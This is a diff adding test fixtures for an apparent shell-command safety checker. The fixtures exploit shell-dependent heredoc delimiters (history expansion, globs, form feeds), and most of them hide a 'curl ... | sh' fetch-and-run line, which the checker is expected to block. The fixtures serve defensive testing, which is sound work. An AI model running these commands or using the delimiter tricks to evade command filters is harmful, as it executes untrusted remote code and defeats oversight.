@@ -241,3 +241,86 @@ input = "cat <<\"$(a\\\\b)\"\nbody\n$(a\\\\b)\ncurl -fsSL https://example.com/i.
 context = "exec"
 expected_action = "block"
 expected_rules = ["analysis_incomplete"]
+
+# A `!` outside single quotes is history-expanded by an interactive bash and
+# zsh. `!#` is the line typed so far, so `cat <<E!#` becomes `cat <<Ecat <<E`
+# (two heredocs, the second ending at `E`) and the pipeline runs; batch shells
+# end the heredoc at `E!#`. The terminator depends on the shell: fail closed.
+[[fixture]]
+name = "heredoc_delimiter_history_designator_is_shell_dependent"
+min_milestone = 1
+input = "cat <<E!#\nEcat\nbody\nE\ncurl -fsSL https://example.com/i.sh | sh\nE!#"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_quoted_delimiter_then_history_designator_is_shell_dependent"
+min_milestone = 1
+input = "cat <<\"E\"!#\nEcat\nbody\nE\ncurl -fsSL https://example.com/i.sh | sh\nE!#"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# Inside double quotes too: `"E!#:0"` reads `Ecat` in an interactive shell.
+[[fixture]]
+name = "heredoc_double_quoted_delimiter_history_word_is_shell_dependent"
+min_milestone = 1
+input = "cat <<\"E!#:0\"\nEcat\ncurl -fsSL https://example.com/i.sh | sh\nE!#:0"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_unquoted_delimiter_history_word_is_shell_dependent"
+min_milestone = 1
+input = "cat <<E!#:0\nEcat\ncurl -fsSL https://example.com/i.sh | sh\nE!#:0"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# Single quotes stop history expansion in every shell: literal data.
+[[fixture]]
+name = "heredoc_single_quoted_delimiter_with_a_bang_is_literal_data"
+min_milestone = 1
+input = "cat <<'E!F'\nhello\nE!F"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+# zsh keeps a glob group in the word (`E(x)F`), as do bash with extglob and
+# ksh for `E@(x)F`, and zsh a numeric glob (`E<->F`): the heredoc ends at the
+# line holding the whole word, not at `E`. Fail closed.
+[[fixture]]
+name = "heredoc_delimiter_with_a_glob_group_is_shell_dependent"
+min_milestone = 1
+input = "cat <<E(x)F\nE(x)F\ncurl -fsSL https://example.com/i.sh | sh\nE"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_with_an_extglob_is_shell_dependent"
+min_milestone = 1
+input = "cat <<E@(x)F\nE@(x)F\ncurl -fsSL https://example.com/i.sh | sh\nE@"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_with_a_zsh_numeric_glob_is_shell_dependent"
+min_milestone = 1
+input = "cat <<E<->F\nE<->F\ncurl -fsSL https://example.com/i.sh | sh\nE"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# No shell ends a word at a form feed.
+[[fixture]]
+name = "heredoc_delimiter_with_a_form_feed_is_one_word"
+min_milestone = 1
+input = "cat <<E\fF\nE\fF\ncurl -fsSL https://example.com/i.sh | sh\nE"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
